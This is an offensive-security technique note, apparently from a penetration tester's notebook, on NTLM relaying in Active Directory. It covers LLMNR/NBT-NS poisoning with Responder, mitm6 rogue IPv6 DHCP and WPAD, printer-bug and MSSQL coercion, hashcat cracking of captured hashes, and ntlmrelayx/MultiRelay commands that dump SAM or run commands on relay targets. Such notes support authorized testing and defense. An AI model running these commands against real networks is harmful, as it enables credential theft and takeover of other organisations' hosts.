# Active Directory - NTLM Relaying

### Overview

The **LLMNR and NBT-NS poisoning attack**, combined with the **SMB Relay
attack**, or **NTLM Relaying**, can be used to gain an authenticated access to
servers by capturing local network `SMB` authentication traffic and relaying it
to targets servers.

Even when the organization has good patch management practices, this reliable
and effective attack can almost always be leveraged to obtain an initial
foothold.

###### LLMNR and NBT-NS poisoning

The **Link-Local Multicast Name Resolution (LLMNR)** and **Netbios Name
Service (NBT-NS)** protocols can be abused to intercept local network traffic.

These components allow machines on the same subnet to identify hosts when `DNS`
resolution fails. If one machine tries to resolve a particular host, but `DNS`
resolution fails, the machine will then attempt to ask all other machines on
the local network for the correct address via `LLMNR` or `NBT-NS`.

An attacker can listen on a network for these `LLMNR` (`UDP`/5355) or `NBT-NS`
(`UDP`/137) broadcasts requests and respond to them, thus pretending to be the
requested host.

Note that following the Microsoft security bulletin `MS16-077` (Security Update
for `WPAD`), the location of the `WPAD` file (which provide the client its
proxy settings) is no longer requested via broadcast protocols, such as `LLMNR`
and `NBT-NS`, but only via `DNS`.

###### NTLM relaying

The **NT LAN Manager v1 and v2** authentication process, used in by the
**Server Message Block (SMB)** protocol can be subverted.

The attack unwinds as follow:
  1. The victim tries to authenticates himself to a server
     (`SMB_COM_NEGOTIATE` Request)
  2. The authentication request is intercepted by an attacker
  3. The attacker initiates an authentication procedure to a targeted server
     and retrieves an authentication challenge (`NTLM_CHALLENGE_MESSAGE`) from
     this server
  4. The attacker forwards this challenge to the victim
  5. The victim answers the challenge to the attacker
     (`NTLM_AUTHENTICATION_MESSAGE`)  
  6. The attacker can then relay the victim challenge response to the targeted
     server to authenticate as the victim
  7. If the victim has local admin rights on the server, an complete access can
     be acquired   

Since MS08-068 you cannot relay a `Net-NTLM` hash back to the same machine you
got it from (e.g. the 'reflective' attack) unless you're performing a
cross-protocol relay.

For the attack to work, `SMB` Signing needs to be disabled on the targeted
machine. While `SMB` packet signing is available in all supported versions of
Windows, it is enabled by default on Domain Controllers.

### NTLM authentication capture

###### LLMNR and NBT-NS poisoning in practice

*To capture and offline crack the hashes captured, do not disable Responder SMB
and HTTP servers. The authentication attempt won't be transmitted to the relay
servers and no NTLM relaying is possible.  
To crack the Net-NTLMv2 hashes use hashcat:  
`hashcat -m 5600 <HASHFILE> <WORDLIST> -o <OUTPUTFILE>`*

`Responder` can be used to conduct the `LLMNR` and `NBT-NS` poisoning attack.

*Do not use the version of Responder on SpiderLab's Github repository as it
isn't maintained anymore, use lgandx's fork instead.*

Edit the `Responder.conf` file and turn off the `SMB` and `HTTP` servers:

```
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

With those servers turned off, the authentication attempts captured are
automatically passed to `ntlmrelayx.py`'s `SMB` and `HTTP` servers for the
relay attack.

`Responder` usage:

```
# -r : Enable answers for netbios wredir suffix queries
# -d : Enable answers for netbios domain suffix queries
# -w :  Start the WPAD rogue proxy server

python Responder.py -I <NETWORK_INTERFACE> -r -d -w
```

If no `NTLM` authentication are captured, after a while, a number of tools can
be used to check whether or not hosts on the local subnetwork have the `LLMNR`
protocol enabled.

Note that even if `LLMNR` is disabled, system have been hardened but `NBT-NS`
may still be enabled.

To check if a specific host, identified by its hostname, has `LLMNR` activated:

```
nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=<HOSTNAME>'
nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=<HOSTNAME>' -e <NETWORK_INTERFACE>

# Metasploit
use auxiliary/scanner/llmnr/query
set NAME <HOSTNAME>
run
```

###### IPv6 rogue DHCP server

By default, every Windows system (starting from `Windows Vista`) will request,
upon booting and periodically, an `IPv6` configuration through the `Dynamic
Host Configuration Protocol version 6 (DHCPv6)` protocol by broadcasting a
`Solicit` request. The `mitm6` `Python` utility will listen on the network for
such `DHCPv6` requests and reply to the emitting hosts, assigning them an
`IPv6` address within the link-local range and setting the attacking machine's
`IP` as their default `IPv6` `DNS` server. As no `IPv6` gateway is specified by
`mitm6`, the victim hosts will not attempt to use `IPv6` for communication
with hosts outside the link-local network. The `DNS` server maliciously
configured on a victim host will be preferred to the host's `IPv4` `DNS` server
and used to query for both `A` (`IPv4`) and `AAAA` (`IPv6`) `DNS` records.

In addition to listening for `DHCPv6` requests, `mitm6` will (by default,
altough optional) regularly broadcast `ICMPv6` `Router Advertisements (RA)`
messages to announce to the link-local network hosts that an `IPv6` network is
deployed and that an `IPv6` adddress should be requested via `DHCPv6`.

Immediately after the attacking machine has been configured as the `DNS` server
of a victim host, `mitm6` will receive `DNS` requests from the victim host for
a `Windows Proxy Auto Detection (WPAD)` service, in the form of `DNS` queries
for `wpad.<DOMAIN_FQDN | HOST_NETWORK_INTERFACE_SUFFIX>`. `mitm6` will respond
to such queries by returning the attacking machine's `IP` as the requested
`WPAD` host. As following the Microsoft security bulletin `MS16-077` (Security
Update for `WPAD`) authentication cannot be directly requested by the `WPAD`
server, `mitm6` will instead provide the victim host with a valid `WPAD` file
that configure the attacking machine's `IP` as its proxy. Futher `HTTP`
requests made by the victim host will be intercepted and replied to with a
`HTTP 407 Proxy Authentication required` `HTTP` response. The `Internet
Explorer (IE)` / `Edge` and `Chrome` web browsers (which rely on `IE`'s
settings) will automatically authenticate to the proxy under the user identity
using `NTLM`, while `Firefox` will not by default.

Note that in environment making use of `WPAD`, `mitm6` will provide a `WPAD`
`wpad.dat` file over the legitimate `WPAD` servers, which may cause
connectivity issues on the victim hosts, such as an impossibility to reach the
Internet. However, in order to mimize network impact, `mitm6` defines a
`DHCP lease` of 5 minutes and sends `DNS` records with a `Time to Live (TTL)`
limited to only 100 seconds. Thus, a victim host configuration will be back to
normal within a few minutes of `mitm6` stopping.  

`mitm6` should be used in combination with the `Impacket`'s `ntlmrelayx.py`
utility, which will provide the `WPAD` server and relay the `NTLM`
authentication request. Refer to the `IPv6 WPAD relay` section below for more
information on how to execute `ntlmrelayx.py`.

```
# -d: the <DOMAIN> to poison WPAD DNS queries for
mitm6 [-i <NETWORK_INTERFACE>] -d <DOMAIN_FQDN>

# Limits the
mitm6 [-i <NETWORK_INTERFACE>] -d <DOMAIN> -hw <HOSTNAME_FQDN_WHITELIST>
mitm6 [-i <NETWORK_INTERFACE>] -d <DOMAIN> -hb <HOSTNAME_FQDN_BLACKLIST>
```

###### MSRPC MS-RPRN "printer bug"

On a machine running the `Spooler Service` (which is the case by-default for
all Windows systems), the `RpcRemoteFindFirstPrinterChangeNotification(Ex)`
function of the `Print System Remote Protocol`, exposed on the `MS-RPRN`
`MSRPC` interface, can be called by any domain user to force the machine to
authenticate to the specified remote system.

The `NTLM` authentication can be thus be captured and eventually relayed. For
more information on how to identify the `MSRPC` interface and call the
`RpcRemoteFindFirstPrinterChangeNotification` function, refer to the `[L7]
MSRPC` note.

###### Microsoft SQL Server (MSSQL)

The (undocumented) `xp_dirtree`, `xp_fileexist` and `xp_getfiledetails` `SQL`
stored procedures can be used to access files on remote systems over `SMB` from
a `MSSQL` service. By default, the account connecting to the database should
only require the `PUBLIC` role to execute the procedures.

The account running the `SQL` service, be it a local or domain joined account,
will authenticate to the `SMB` share by completing a `Net-NTLMv1` or
`Net-NTLMv2` challenge. The challenge can be captured and eventually relayed.

For more information, refer to the `[L7] MSSQL` note.

###### Exchange Web Services (EWS) SOAP API

TODO

### NTLM authentication relay

###### Hosts with SMB signing disabled

First, a list of host with `SMB signing` must be gathered.

Either `nmap`, `CMEv4` or `PingCastle` (personal favorite) can be used to
gather a list of host with `SMB signing` disabled and output the result to a
file:

```bash
PingCastle.exe -> 5-scanner -> a-smb -> 1-all

nmap -v -sU -sS --open -oA nmap_smb_signing_off --script smb-security-mode.nse -p U:137,T:139,445 <TARGETS>
cat nmap_smb_signing_off.nmap | grep -B 14 "message_signing: disabled" | grep "Nmap scan report for" | cut -d " " -f 5 > <FILE>

cme smb <HOSTNAME | IP | CIDR | TARGETS_FILE> --gen-relay-list <FILE>
```

###### Basic relay

The `Impacket`'s `ntlmrelayx.py` or `MultiRelay.py`, that comes with the
`Responder` toolkit for example, `Python` scripts can be used to relay the
`NTLM` authentication.  

By default, `ntlmrelayx` will dump the `SAM` base of the system the
authentication is relayed to. Note that the functionality may sometimes fail,
and that the execution of a unitary command should generally be prefered.

```
MultiRelay.py -t <TARGET_IP | TARGET_HOSTNAME> -c '<COMMAND>' -u '<ALL | USERNAME_TO_RELAY>'

# The authentication can be relayed to a specific service, such as smb://<TARGET_IP | TARGET_HOSTNAME> or ldaps://<TARGET_IP | TARGET_HOSTNAME>
ntlmrelayx.py [-smb2support] -t <TARGET_IP | TARGET_HOSTNAME | TARGET_SERVICE> -l <DIRECTORY_OUTPUT>
ntlmrelayx.py [-smb2support] -tf <TARGETS_FILE> -l <DIRECTORY_OUTPUT>

ntlmrelayx.py [-smb2support] -t <TARGET_IP | TARGET_HOSTNAME | TARGET_SERVICE> -c <COMMAND>
ntlmrelayx.py [-smb2support] -tf <TARGETS_FILE> -c <COMMAND>
```

###### IPv6 WPAD relay

The `Impacket`'s `ntlmrelayx.py` utility can be used to relay `NTLM`
authentication captured using the `mitm6` utility.

```
# The authentication can be relayed to a specific service, such as smb://<TARGET_IP | TARGET_HOSTNAME> or ldaps://<TARGET_IP | TARGET_HOSTNAME>
# -wh: the specified WPAD hostname should be a hostname not in use in the victim network

ntlmrelayxpy -6 [-smb2support] -wh <FAKE_WPAD_HOST> -t <TARGET_IP | TARGET_HOSTNAME | TARGET_SERVICE>
ntlmrelayxpy -6 [-smb2support] -wh <FAKE_WPAD_HOST> -t <TARGET_IP | TARGET_HOSTNAME | TARGET_SERVICE> -c <COMMAND>
```
